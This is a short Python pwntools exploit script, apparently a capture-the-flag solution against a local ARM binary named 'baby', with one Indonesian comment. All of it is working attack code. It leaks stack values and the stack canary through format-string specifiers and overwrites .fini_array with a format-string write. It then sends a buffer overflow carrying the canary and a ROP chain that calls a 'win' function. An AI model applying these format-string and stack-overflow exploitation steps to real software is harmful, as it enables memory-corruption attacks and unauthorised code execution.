from pwn import *

def leak_stack(value):
    for x in range (1, value):
        p = process("./baby")

        print "Offset number {}".format(x)

        payload = ""
        payload += "%{}$p".format(x)

        p.sendline(payload)
        
        stack_value = p.recv()
        if stack_value.find("00") != -1:
            print "Canary found"
            print "Canary value : {}".format(stack_value)
            break
        else:
            print "Stack value : {}".format(stack_value)
            
        p.close()

def exploit():
    p = process("./baby")
    binary = ELF("baby")

    fini_array = 0x0086b90 #didapatkan melalui 'objdump -h ./baby'
    pop_r0 = 0x0005e86c # pop {r0, pc}
    win = binary.symbols['win']

    payload = ''
    payload += '%{}p'.format(0x037c)
    payload += '%{}$hn'.format(7 + (20 / 4))
    payload += '-%57$p-'
    payload = payload.ljust(20, 'A')

    payload += p32(fini_array)
    # gdb.attach(p)

    p.sendline(payload)

    p.recvuntil('-')
    canary = p.recvuntil('-')[:-1]
    canary = int(canary, 16)
    log.info("Canary : {}".format(hex(canary)))

    payload = ''
    payload += 'A' * 200
    payload += p32(canary)
    payload += 'JUNK'
    payload += p32(pop_r0)
    payload += p32(0xf00dbab3)
    payload += p32(win)

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()
    # leak_stack(100)